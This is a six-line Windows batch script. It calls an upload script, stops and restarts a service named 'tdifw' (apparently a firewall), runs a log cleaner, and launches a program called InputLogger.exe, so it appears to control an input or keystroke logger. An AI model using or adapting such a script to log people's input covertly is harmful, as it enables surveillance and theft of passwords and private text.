@echo off
call "%ProgramFiles%\logger\upload.bat"
net stop tdifw
"%ProgramFiles%\logger\CleanLog.exe"
net start tdifw
"%ProgramFiles%\logger\InputLogger.exe"
